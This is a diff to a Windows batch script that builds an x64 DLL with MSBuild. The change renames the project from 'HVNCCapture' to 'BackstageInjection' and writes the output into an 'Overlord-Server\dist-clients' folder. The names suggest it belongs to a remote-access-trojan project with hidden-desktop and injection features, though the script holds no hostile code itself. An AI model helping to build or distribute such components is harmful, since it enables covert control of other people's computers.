@@ -1,10 +1,10 @@
 @echo off
 setlocal EnableDelayedExpansion
-REM Build HVNCCapture DLL for Windows x64 using MSBuild (vcxproj).
+REM Build BackstageInjection DLL for Windows x64 using MSBuild (vcxproj).
 REM Run from VS Developer Command Prompt, or let the script detect VS.
 
 set ROOT=%~dp0
-set PROJ=%ROOT%HVNCCapture\HVNCCapture.vcxproj
+set PROJ=%ROOT%BackstageInjection\BackstageInjection.vcxproj
 set OUT_DIR=%ROOT%Overlord-Server\dist-clients
 set CONFIG=Release
 set PLATFORM=x64
@@ -27,7 +27,7 @@ if %ERRORLEVEL% neq 0 (
 
 if not exist "%OUT_DIR%" mkdir "%OUT_DIR%"
 
-echo Building HVNCCapture.vcxproj [%CONFIG%^|%PLATFORM%] ...
+echo Building BackstageInjection.vcxproj [%CONFIG%^|%PLATFORM%] ...
 if defined MSBUILD_PATH (
     "!MSBUILD_PATH!" "%PROJ%" /p:Configuration=%CONFIG% /p:Platform=%PLATFORM% /p:OutDir="%OUT_DIR%\\" /m /nologo /v:minimal
 ) else (
@@ -35,14 +35,14 @@ if defined MSBUILD_PATH (
 )
 if %ERRORLEVEL% neq 0 goto :error
 
-if not exist "%OUT_DIR%\HVNCCapture.x64.dll" (
+if not exist "%OUT_DIR%\BackstageInjection.x64.dll" (
     echo ERROR: DLL not found in output directory.
     goto :error
 )
 
 echo.
-echo Built: %OUT_DIR%\HVNCCapture.x64.dll
-dir "%OUT_DIR%\HVNCCapture.x64.dll"
+echo Built: %OUT_DIR%\BackstageInjection.x64.dll
+dir "%OUT_DIR%\BackstageInjection.x64.dll"
 
 echo Done.
 exit /b 0
